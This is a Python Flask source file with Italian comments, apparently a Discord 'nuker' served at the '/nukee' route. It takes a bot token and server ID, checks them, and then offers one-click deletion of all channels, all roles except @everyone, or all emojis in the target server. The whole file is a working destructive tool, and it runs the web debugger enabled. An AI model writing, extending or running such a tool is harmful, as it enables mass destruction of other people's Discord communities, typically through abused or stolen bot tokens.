from flask import Flask, render_template, request, redirect
import discord, asyncio, threading, werkzeug.serving


# --- CONSTANTS ---
DEBUGGER = True


# --- Discord Checks ---
async def check_token(token: str):
    client = discord.Client(intents=discord.Intents.default())
    try:
        await client.login(token)
        await client.close()
        return True
    except discord.errors.LoginFailure:
        return False

async def check_server(token: str, server_id:int):
    client = discord.Client(intents=discord.Intents.default())
    ret = False
    
    @client.event
    async def on_ready():
        nonlocal ret
        server = client.get_guild(server_id)
        if server is not None:
            ret = True
        await client.close()
        
    await client.start(token)
    return ret


# --- Discord Functions ---
def ch_delete(token: str, serverid: int): # Elimina tutti i canali
    try:
        intents = discord.Intents.default()
        intents.all()
        client = discord.Client(intents=intents)
        @client.event
        async def on_ready():
            print('--- ELIMINAZIONE CANALI ---')
            server = client.get_guild(serverid)
            if server:
                canali = server.channels
                for c in canali:
                    try:
                        await c.delete()
                        print(f'Canale eliminato: {c.name} | {c.id}')
                    except Exception as e:
                        print(f'[{e}] Impossibile eliminare: {c.name} | {c.id}')
                        continue
                print("--- OPERAZIONE TERMINATA ---\n")
            else:
                print("IMPOSSIBILE TROVARE IL SERVER\n")
            await client.close()        
        client.run(token)
    except Exception as e:
        print(f"ERRORE: {e}\n")

def ro_delete(token: str, serverid: int): # Elimina tutti i ruoli
    try:
        intents = discord.Intents.default()
        intents.all()
        client = discord.Client(intents=intents)
        @client.event
        async def on_ready():
            print('--- ELIMINAZIONE RUOLI ---')
            server = client.get_guild(serverid)
            if server:
                ruoli = server.roles
                for r in ruoli:
                    if r.name != '@everyone':
                        try:
                            await r.delete()
                            print(f'Ruolo eliminato: {r.name} | {r.id}')
                        except Exception as e:
                            print(f'[{e}] Impossibile eliminare il ruolo: {r.name} | {r.id}')
                            continue
                print("--- OPERAZIONE TERMINATA ---\n")
            else:
                print("IMPOSSIBILE TROVARE IL SERVER\n")
            await client.close()
        client.run(token)
    except Exception as e:
        print(f"ERRORE: {e}\n")

def em_delete(token: str, serverid: int): # Elimina tutte le emoji
    try:
        intents = discord.Intents.default()
        intents.all()
        client = discord.Client(intents=intents)
        @client.event
        async def on_ready():
            print('--- ELIMINAZIONE RUOLI ---')
            server = client.get_guild(serverid)
            if server:
                emoji = server.emojis
                for em in emoji:
                    try:
                        await em.delete()
                        print(f'Emoji eliminata: {em.name} | {em.id}')
                    except Exception as e:
                        print(f'[{e}] Impossibile eliminare: {em.name} | {em.id}')
                        continue
                print("--- OPERAZIONE TERMINATA ---\n")
            else:
                print("IMPOSSIBILE TROVARE IL SERVER\n")
            await client.close()        
        client.run(token)
    except Exception as e:
        print(f"ERRORE: {e}\n")

# --- Flask ---
app = Flask(__name__)
tk = ""
sid = 0

@app.route("/")
def index():
    return redirect("/nukee")

@app.route("/nukee", methods=["GET", "POST"])
def login():
    global tk, sid
    if request.method == "GET":
        return render_template("login.html", tk_v=tk, ids_v=sid)
    elif request.method == "POST":
        r = request.form.get("r", "0")
        if r != "0":
            return render_template("loading_r.html", r=r)
        tk = request.form["token"]
        try: 
            sid = int(request.form["server-id"])
        except ValueError: 
            sid = 0
        l = request.form.get("l", "0")
        if l == "0":
            return render_template("loading_l.html", token=tk, serverid=sid)
        if asyncio.run(check_token(tk)) == True:
            tk_v = "is-valid"
            if asyncio.run(check_server(tk, sid)) == True:
                sid_v = "is-valid"
                return render_template("dashboard.html", hidden="hidden")
            else:
                sid_v = "is-invalid"
        else:
            tk_v = "is-invalid"
            sid_v = ""
        return render_template("login.html", tk_v=tk_v, ids_v=sid_v)

@app.route("/nukee/r", methods=["POST"])
def r():
    r = request.form["r"]
    if r == "1":
        ch_delete(token=tk, serverid=sid)
        return render_template("dashboard.html", hidden="")
    elif r == "2":
        ro_delete(token=tk, serverid=sid)
        return render_template("dashboard.html", hidden="")
    elif r == "3":
        em_delete(token=tk, serverid=sid)
        return render_template("dashboard.html", hidden="")



if __name__ == "__main__":
    def start_flask():
        global DEBUGGER
        werkzeug.serving.run_simple("localhost", 5000, app, use_reloader=False, use_debugger=DEBUGGER)
    flask_thread = threading.Thread(target=start_flask)
    flask_thread.start()
    flask_thread.join()